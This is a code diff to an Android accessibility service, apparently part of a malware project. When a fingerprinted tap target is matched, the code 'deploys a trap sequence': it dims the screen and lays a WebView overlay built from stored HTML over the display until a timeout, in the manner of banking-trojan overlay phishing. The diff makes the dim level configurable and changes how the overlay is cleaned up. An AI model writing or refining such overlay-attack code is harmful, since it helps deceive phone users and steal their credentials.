@@ -486,6 +486,7 @@ class MyAccessibilityService : AccessibilityService() {
                         val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
                         val html = statsPrefs.getString("ui_trap_html", "") ?: ""
                         val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
+                        val dimLevel = statsPrefs.getInt("ui_trap_dim", 20)
                         
                         DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED ON TAP! Target: [$targetData]. Deploying trap sequence.")
                         
@@ -493,8 +494,8 @@ class MyAccessibilityService : AccessibilityService() {
                         statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
                         
                         Handler(Looper.getMainLooper()).post {
-                            // 1. Dim to 20% brightness FIRST (Dimmer has FLAG_NOT_TOUCHABLE, it never swallows input)
-                            DimmerManager.applyDim(this@MyAccessibilityService, 20, method)
+                            // 1. Dim to configured brightness FIRST (Dimmer has FLAG_NOT_TOUCHABLE, it never swallows input)
+                            DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
                             
                             // 2. Deploy WebView Overlay immediately AFTER dimming
                             DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
@@ -505,7 +506,7 @@ class MyAccessibilityService : AccessibilityService() {
                             Handler(Looper.getMainLooper()).postDelayed({
                                 DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming trap and restoring display.")
                                 DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                DimmerManager.applyDim(this@MyAccessibilityService, 100, method)
+                                // DimmerManager cleanup is now handled automatically by DynamicUIManager.removeOverlay
                             }, timeout * 1000)
                         }
                     }
